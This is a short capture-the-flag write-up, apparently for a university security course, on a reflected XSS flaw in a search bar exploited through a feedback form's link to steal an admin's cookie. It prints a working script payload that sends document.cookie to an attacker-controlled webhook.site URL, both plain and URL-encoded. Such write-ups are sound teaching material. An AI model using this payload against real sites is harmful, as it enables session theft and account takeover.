# Challenge `My favourite cookies` writeup

- Vulnerability: XSS
- Where: In the feedback form's link field
- Impact: It allows the retrieval of a remote user's (in this case, the admin's) cookies

## Finding the vulnerability / Steps to reproduce

1. The first step to retrieve the admin's cookie is setting up a web server (for example, in [Webhook](https://webhook.site/<id>)) to intercept incoming requests.
2. A first request shows that the provided link is then accessed, leaving an opportunity to inject a custom script into our link, as long as the endpoint belongs to one of the website's.
3. After testing in the search bar with a script that redirects the content of the accessing user's cookie to our website (`<script>window.location.href='https://webhook.site/<id>?cookie='+document.cookie</script>`), that URL (`http://mustard.stt.rnl.tecnico.ulisboa.pt:23251/?search=%3Cscript%3Ewindow.location.href%3D%27https%3A%2F%2Fwebhook.site%2F<id>%3Fcookie%3D%27%2Bdocument.cookie%3B%3C%2Fscript%3E`) can then be used in the feedback form.
4. As soon as the admin enters the link, the request is intercepted by our web server, thus revealing its cookie (`SSof{This_is_my_very_secret_secret`).